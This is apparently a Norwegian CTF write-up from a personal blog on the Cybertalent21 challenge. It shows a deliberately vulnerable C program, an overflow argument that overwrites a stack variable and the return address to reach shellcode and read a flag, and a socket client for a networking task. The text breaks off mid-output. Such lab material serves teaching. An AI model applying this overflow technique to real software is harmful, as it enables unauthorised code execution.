@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title>BASHGOBRR</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <link rel="icon" href="//favicon.ico">
+    <link rel="canonical" href="/">
+    
+    
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="/">BASHGOBRR</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/about/">
+                                    
+                                    <span>About</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/post/">
+                                    
+                                    <span>All posts</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav><div id="content" class="container">
+
+<div class="row-fluid navmargin">
+    <div class="page-header">
+        <h1>Cybertalent21: part 1 - Sat, Jan 16, 2021.
+        
+          
+              
+              
+                  <a href="/categories/ctf-writeup/" data-rel="prefetch">Ctf Writeup</a>
+              
+          
+        </h1>
+
+    </div>
+        
+        <ul id="tags">
+            
+                
+                
+                    <a href="/tags/ctf/" data-rel="prefetch">CTF</a>
+                
+            
+                
+                
+                    <a href="/tags/etj/" data-rel="prefetch">ETJ</a>
+                
+            
+                
+                
+                    <a href="/tags/reversing/" data-rel="prefetch">Reversing</a>
+                
+            
+                
+                
+                    <a href="/tags/networking/" data-rel="prefetch">Networking</a>
+                
+            
+        </ul>
+        
+        <ul id="series">
+            
+                Series:
+                
+                
+                    <a href="/series/cybertalent21/" data-rel="prefetch">Cybertalent21</a>
+                
+            
+        </ul>
+    <p class="lead">CTF for the Norwegian Intelligence Service (Etterretningstjenesten), the writeup is in norwegian as I am too lazy to translate. This is the first part of a 3-part series about this CTF.</p>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1_grunnleggende">1_grunnleggende</a>
+      <ul>
+        <li><a href="#4_overflow">4_overflow</a></li>
+        <li><a href="#5_nettverk">5_nettverk</a></li>
+        <li><a href="#6_reversing">6_reversing</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    <h2 id="1_grunnleggende">1_grunnleggende</h2>
+<p>Denne delen var bestående av 6 deloppgaver som oppvarming til CTF&rsquo;en og selve oppdraget.
+Del 1 - 3 er EZ, så blir ikke noe writeup av det.</p>
+<h3 id="4_overflow">4_overflow</h3>
+<p><em>Oppgavetekst:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Buffer overflow
+
+Hver prosess har sitt eget minneområde. Hvis man ved hjelp av en sårbarhet kan
+endre på vilkårlige data i minnet kan man få programmet til å gjøre noe
+annet enn tiltenkt.
+
+Den klassiske måten å gjøre dette på ble beskrevet i artikkelen Smashing
+The Stack For Fun And Profit, publisert i Phrack Magazine #49 i
+1996. For å forstå resten av denne teksten, anbefaler vi å lese artikkelen på
+http://phrack.org/issues/49/14.html.
+
+Siden 90-tallet har både prosessorer, operativsystemer, kompilatorer og
+programmeringspråk introdusert mange mekanismer som forsøker å gjøre det
+vanskeligere å utnytte sårbarheter som tillater minnekorrupsjon. Hver for
+seg er disse mekanismene som regel enkle å omgå, men kombinasjonen av dem gjør
+det langt mer tidkrevende og komplisert å skrive exploits i dag enn for 20
+år siden. Ofte vil man ha behov for å kombinere flere sårbarheter før man kan
+ta full kontroll over en prosess, for eksempel minnelekkasjer for å omgå
+minnerandomisering (ASLR), før man kan overskrive en returadresse.
+
+Programmet i denne mappen er laget for å visualisere hvordan data plasseres på
+stacken og hvordan man kan påvirke programflyten i main(). Funksjonen
+setter av plass i minnet til en håndfull lokale variabler, og en av disse er et
+buffer på 32 byte. Det første argumentet kopieres inn i bufferet ved hjelp
+av strcpy() (uten å sjekke størrelsen på tekststrengen). Dette fører
+til at variablene som ligger på høyere minneadresser kan overskrives.
+
+Det første skrittet for å lese ut flagget er å endre &#39;above&#39; til en hardkodet
+verdi du finner i kildekoden. For å gjøre det siste skrittet lettere, allokeres
+det eksekverbart minne hvor du kan legge inn egen shellkode, eller
+bruke den som ligger i filen sample_shellcode.
+
+────────────────────
+$ export SHC=$(cat sample_shellcode)
+$ cat overflow.c
+$ ./overflow AAAAAAAA
+$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$ ???
+────────────────────
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~/1_grunnleggende/4_overflow$ ls -lga
+total <span style="color:#ae81ff">28</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> login  <span style="color:#ae81ff">1024</span> Feb <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-xr-x <span style="color:#ae81ff">8</span> login  <span style="color:#ae81ff">1024</span> Feb <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2020</span> ..
+-r-------- <span style="color:#ae81ff">1</span> login    <span style="color:#ae81ff">33</span> Jan <span style="color:#ae81ff">16</span> 20:34 FLAGG
+-r--r--r-- <span style="color:#ae81ff">1</span> login  <span style="color:#ae81ff">1986</span> Feb <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2020</span> LESMEG.md
+-r-sr-xr-x <span style="color:#ae81ff">1</span> login <span style="color:#ae81ff">17208</span> Feb <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2020</span> overflow
+-r--r--r-- <span style="color:#ae81ff">1</span> login  <span style="color:#ae81ff">4535</span> Feb <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2020</span> overflow.c
+-r--r--r-- <span style="color:#ae81ff">1</span> login    <span style="color:#ae81ff">38</span> Feb <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2020</span> sample_shellcode
+</code></pre></div><p>Vi har ikke tilgang til å lese innholdet i FLAGG filen. Vi sjekker ut kildekoden</p>
+<p><em>overflow.c</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdarg.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define SHELLCODE_ADDRESS 0x303030303030
+</span><span style="color:#75715e">#define KGREEN &#34;\033[01;32m&#34;
+</span><span style="color:#75715e">#define KRED &#34;\033[31m&#34;
+</span><span style="color:#75715e">#define KRESET &#34;\033[0m&#34;
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Allocate a page of executable memory at SHELLCODE_ADDRESS,
+</span><span style="color:#75715e"> * and fill it with nop-sled and contents of environment variable SHC.
+</span><span style="color:#75715e"> * If SHC is not set, fill with breakpoints to trap program flow.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>
+<span style="color:#a6e22e">prep_shellcode</span>(<span style="color:#66d9ef">void</span>)
+{
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>shc    <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;SHC&#34;</span>);
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>retval <span style="color:#f92672">=</span> mmap((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(SHELLCODE_ADDRESS <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#ae81ff">4096</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)),
+	                    <span style="color:#ae81ff">4096</span>,
+	                    PROT_READ <span style="color:#f92672">|</span> PROT_WRITE <span style="color:#f92672">|</span> PROT_EXEC,
+	                    MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS <span style="color:#f92672">|</span> MAP_FIXED,
+	                    <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
+	                    <span style="color:#ae81ff">0</span>);
+
+	<span style="color:#66d9ef">if</span> (retval <span style="color:#f92672">==</span> MAP_FAILED) {
+		printf(<span style="color:#e6db74">&#34;Failed to mmap area for shellcode: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, strerror(errno));
+		exit(<span style="color:#ae81ff">1</span>);
+	}
+
+	<span style="color:#66d9ef">if</span> (shc <span style="color:#f92672">&amp;&amp;</span> strlen(shc) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4096</span>) {
+		<span style="color:#75715e">/* SHC is set; fill memory page with nops and stuff shellcode at the end */</span>
+		memset(retval, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">4096</span>);
+		memcpy(retval <span style="color:#f92672">+</span> <span style="color:#ae81ff">4096</span> <span style="color:#f92672">-</span> strlen(shc), shc, strlen(shc));
+	} <span style="color:#66d9ef">else</span> {
+		<span style="color:#75715e">/* No SHC; trigger trace/breakpoint trap */</span>
+		memset(retval, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">4096</span>);
+	}
+
+	<span style="color:#75715e">/* Returning retval is more precise, but leaves a confusing null-byte in the address. */</span>
+	<span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)SHELLCODE_ADDRESS;
+}
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Print hexdump of memory, with one memory range (&#39;modified&#39;) highlighted.
+</span><span style="color:#75715e"> * Optional arguments are address/name pairs to describe content of each line.
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">void</span>
+<span style="color:#a6e22e">hexdump</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>base, <span style="color:#66d9ef">long</span> len, <span style="color:#66d9ef">long</span> width,
+        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>modified_start, <span style="color:#66d9ef">long</span> modified_length,
+        <span style="color:#66d9ef">long</span> name_list_len, ...)
+{
+	<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>  named_addresses[name_list_len <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>];
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>  named_addresses_name[name_list_len <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>];
+	va_list name_list;
+	va_start(name_list, name_list_len);
+
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; n <span style="color:#f92672">&lt;</span> name_list_len <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; n<span style="color:#f92672">++</span>) {
+		named_addresses[n]      <span style="color:#f92672">=</span> va_arg(name_list, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>);
+		named_addresses_name[n] <span style="color:#f92672">=</span> va_arg(name_list, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>);
+	}
+
+	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> len; i <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">-=</span> width) {
+		<span style="color:#75715e">/* Print memory address, and possibly overwrite with name from named_addresses */</span>
+		printf(<span style="color:#e6db74">&#34;%-16p&#34;</span>, base <span style="color:#f92672">+</span> i); <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; n <span style="color:#f92672">&lt;</span> name_list_len <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; n<span style="color:#f92672">++</span>) { <span style="color:#66d9ef">if</span> (base <span style="color:#f92672">+</span> i <span style="color:#f92672">==</span> named_addresses[n]) {
+				printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">%-16s&#34;</span>, named_addresses_name[n]);
+				<span style="color:#66d9ef">break</span>;
+			}
+		}
+
+		<span style="color:#75715e">/* Print hex dump of next `width` bytes */</span>
+		<span style="color:#75715e">/* Use red color for bytes modified by strcpy */</span>
+		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; n <span style="color:#f92672">&lt;</span> width; n<span style="color:#f92672">++</span>) {
+			<span style="color:#66d9ef">if</span> (modified_start <span style="color:#f92672">&lt;=</span> base <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> n <span style="color:#f92672">&amp;&amp;</span> base <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> n <span style="color:#f92672">&lt;</span> modified_start <span style="color:#f92672">+</span> modified_length)
+				printf(KRED);
+			printf(<span style="color:#e6db74">&#34; %02x&#34;</span> KRESET, base[i <span style="color:#f92672">+</span> n]);
+		}
+
+		<span style="color:#75715e">/* Print ascii representation, or &#39;.&#39; if byte is non-printable */</span>
+		<span style="color:#75715e">/* Use red color for bytes modified by strcpy */</span>
+		printf(<span style="color:#e6db74">&#34;  |&#34;</span>);
+		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; n <span style="color:#f92672">&lt;</span> width; n<span style="color:#f92672">++</span>) {
+			<span style="color:#66d9ef">if</span> (modified_start <span style="color:#f92672">&lt;=</span> base <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> n <span style="color:#f92672">&amp;&amp;</span> base <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> n <span style="color:#f92672">&lt;</span> modified_start <span style="color:#f92672">+</span> modified_length)
+				printf(KRED);
+			printf(<span style="color:#e6db74">&#34;%c&#34;</span> KRESET, (base[i <span style="color:#f92672">+</span> n] <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">&amp;&amp;</span> base[i <span style="color:#f92672">+</span> n] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7f</span>) <span style="color:#f92672">?</span> base[i <span style="color:#f92672">+</span> n] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.&#39;</span>);
+		}
+		printf(<span style="color:#e6db74">&#34;|</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	}
+}
+
+<span style="color:#66d9ef">int</span>
+<span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+{
+	<span style="color:#66d9ef">long</span>           above <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  buffer[<span style="color:#ae81ff">32</span>];
+	<span style="color:#66d9ef">long</span>           below         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6867666564636261</span>;
+	<span style="color:#66d9ef">long</span>           width         <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>shellcode_ptr <span style="color:#f92672">=</span> prep_shellcode();
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p             <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>p;
+
+	printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Before strcpy:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;above = 0x%16lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, above);
+	printf(<span style="color:#e6db74">&#34;below = 0x%16lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, below);
+
+	<span style="color:#75715e">/* Copy first argument to buffer, potentially overflowing the stack */</span>
+	<span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>)
+		strcpy(buffer, argv[<span style="color:#ae81ff">1</span>]);
+
+	printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">After strcpy:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74">&#34;above = 0x%16lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, above);
+	printf(<span style="color:#e6db74">&#34;below = 0x%16lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, below);
+
+	printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Stackdump:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	hexdump(p, <span style="color:#ae81ff">128</span>, width, buffer, argc <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">?</span> strlen(argv[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>, <span style="color:#f92672">&amp;</span>above, <span style="color:#e6db74">&#34;&amp;above&#34;</span>, <span style="color:#f92672">&amp;</span>buffer, <span style="color:#e6db74">&#34;&amp;buffer&#34;</span>, <span style="color:#f92672">&amp;</span>below, <span style="color:#e6db74">&#34;&amp;below&#34;</span>, <span style="color:#f92672">&amp;</span>width, <span style="color:#e6db74">&#34;&amp;width&#34;</span>, <span style="color:#f92672">&amp;</span>shellcode_ptr, <span style="color:#e6db74">&#34;&amp;shellcode_ptr&#34;</span>, <span style="color:#f92672">&amp;</span>p, <span style="color:#e6db74">&#34;&amp;p&#34;</span>, p <span style="color:#f92672">+</span> <span style="color:#ae81ff">96</span>, <span style="color:#e6db74">&#34;stored rbp&#34;</span>, p <span style="color:#f92672">+</span> <span style="color:#ae81ff">104</span>, <span style="color:#e6db74">&#34;stored rip&#34;</span>);
+
+	<span style="color:#75715e">/* Now that output and overflows are done with, inspect the results */</span>
+
+	<span style="color:#66d9ef">if</span> (above <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4847464544434241</span>) {
+		printf(KGREEN <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">above is correct!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> KRESET);
+		printf(<span style="color:#e6db74">&#34;Next step is to adjust the stored rip to point to shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> strlen(argv[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&gt;=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>above <span style="color:#f92672">-</span> buffer) {
+		printf(KRED <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">above has incorrect value.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> KRESET);
+		printf(<span style="color:#e6db74">&#34;Read source code to find the magic number.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		<span style="color:#75715e">/* Call exit() to avoid returning to user controlled memory */</span>
+		exit(<span style="color:#ae81ff">1</span>);
+	} <span style="color:#66d9ef">else</span> {
+		printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">above has not been overwritten.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+		printf(<span style="color:#e6db74">&#34;Supply an argument which is long enough to overflow buffer, &#34;</span>);
+		printf(<span style="color:#e6db74">&#34;and modify the value of &#39;above&#39;.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	}
+
+	<span style="color:#75715e">/* Return, possibly to user controlled memory */</span>
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Koden leser inn hva som er lagret i miljøvariablen &ldquo;SHC&rdquo; og peker til verden med &ldquo;shellcode_ptr&rdquo;.
+Vi må sette above til riktig bytes (ABCDEFGH) og sette rip til å peke til shellkode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~/1_grunnleggende/4_overflow$ export SHC<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat sample_shellcode<span style="color:#66d9ef">)</span>
+login@corax:~/1_grunnleggende/4_overflow$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHAAAAAAAAAAAAAAAAAAAAAAA0000000
+
+Before strcpy:
+above <span style="color:#f92672">=</span> 0x               <span style="color:#ae81ff">0</span>
+below <span style="color:#f92672">=</span> 0x6867666564636261
+
+After strcpy:
+above <span style="color:#f92672">=</span> 0x4847464544434241
+below <span style="color:#f92672">=</span> 0x6867666564636261
+
+Stackdump:
+0x7ffe452738b0   <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  |........|
+0x7ffe452738a8   <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">27</span> <span style="color:#ae81ff">45</span> fe 7f <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  |x9<span style="color:#e6db74">&#39;E....|
+</span><span style="color:#e6db74">0x7ffe452738a0   00 00 00 00 00 00 00 00  |........|
+</span><span style="color:#e6db74">stored rip       30 30 30 30 30 30 00 00  |000000..|
+</span><span style="color:#e6db74">stored rbp       41 41 41 41 41 41 41 30  |AAAAAAA0|
+</span><span style="color:#e6db74">0x7ffe45273888   41 41 41 41 41 41 41 41  |AAAAAAAA|
+</span><span style="color:#e6db74">0x7ffe45273880   41 41 41 41 41 41 41 41  |AAAAAAAA|
+</span><span style="color:#e6db74">&amp;above           41 42 43 44 45 46 47 48  |ABCDEFGH|
+</span><span style="color:#e6db74">0x7ffe45273870   41 41 41 41 41 41 41 41  |AAAAAAAA|
+</span><span style="color:#e6db74">0x7ffe45273868   41 41 41 41 41 41 41 41  |AAAAAAAA|
+</span><span style="color:#e6db74">0x7ffe45273860   41 41 41 41 41 41 41 41  |AAAAAAAA|
+</span><span style="color:#e6db74">0x7ffe45273858   41 41 41 41 41 41 41 41  |AAAAAAAA|
+</span><span style="color:#e6db74">&amp;buffer          41 41 41 41 41 41 41 41  |AAAAAAAA|
+</span><span style="color:#e6db74">&amp;below           61 62 63 64 65 66 67 68  |abcdefgh|
+</span><span style="color:#e6db74">&amp;width           08 00 00 00 00 00 00 00  |........|
+</span><span style="color:#e6db74">&amp;shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
+</span><span style="color:#e6db74">&amp;p               30 38 27 45 fe 7f 00 00  |08&#39;</span>E....|
+
+above is correct!
+Next step is to adjust the stored rip to point to shellcode
+$ cat FLAGG
+1ed164a72773297e0c1239bff77e56e3
+</code></pre></div><h3 id="5_nettverk">5_nettverk</h3>
+<p><em>Oppgavetekst:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">┄Nettverksprogrammering
+
+Så langt har oppgavene dreid seg om å få tilgang til filer på en maskin hvor
+man allerede har tilgang. Dataangrep starter ofte ved at man må skaffe seg denne
+tilgangen ved å utnytte en nettverkstjeneste som er tilgjengelig på internett.
+
+I denne mappen ligger en server som, etter å ha blitt startet, lytter på port
+tcp/10015. For å få tak i flagget trenger du ikke overflows som i forrige
+oppgave, men du må vise at du behersker programmeringsferdigheter som å håndtere
+flere samtidige tilkoblinger og konvertering av binære data.
+
+────────────────────
+$ cp client.py ~/1.5_client.py
+$ ./server
+$ # I ny terminal:
+$ nano ~/1.5_client.py
+$ ~/1.5_client.py
+$ scoreboard &lt;FLAGG&gt;
+────────────────────
+</code></pre></div><p>Etter litt progging med prøving og feiling kommer jeg frem til:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> socket
+<span style="color:#f92672">import</span> struct
+<span style="color:#f92672">import</span> select
+
+TCP_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+TCP_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">10015</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    connections <span style="color:#f92672">=</span> []
+    conn <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+    conn<span style="color:#f92672">.</span>connect((TCP_IP, TCP_PORT))
+    print(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+        print(i)
+        conn2 <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+        conn2<span style="color:#f92672">.</span>connect((TCP_IP, TCP_PORT))
+        <span style="color:#75715e"># conn2.setblocking(0)</span>
+        connections<span style="color:#f92672">.</span>append(conn2)
+
+    print(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+    num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+        num <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;I&#34;</span>, connections[i]<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>))[<span style="color:#ae81ff">0</span>]
+    print(num)
+    data <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;i&#34;</span>, num)
+    print(data)
+    conn<span style="color:#f92672">.</span>sendall(data)
+    print(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4095</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+        r, w, x <span style="color:#f92672">=</span> select<span style="color:#f92672">.</span>select(connections, [], [])
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> r:
+            <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> r:
+                data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+                data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>decode()
+                <span style="color:#66d9ef">if</span> data <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
+                    <span style="color:#66d9ef">break</span>
+                <span style="color:#66d9ef">else</span>:
+                    print(data, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; &#34;</span>)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    main()
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">login@corax:~$ ./1.5_client.py
+Dette er en grunnleggende introduksjon til nettverksprogrammering.
+Når du har åpnet ti nye tilkoblinger til denne serveren vil du få videre instruksjoner på denne socketen.
+
+<span style="color:#ae81ff">0</span>
+<span style="color:#ae81ff">1</span>
+<span style="color:#ae81ff">2</span>
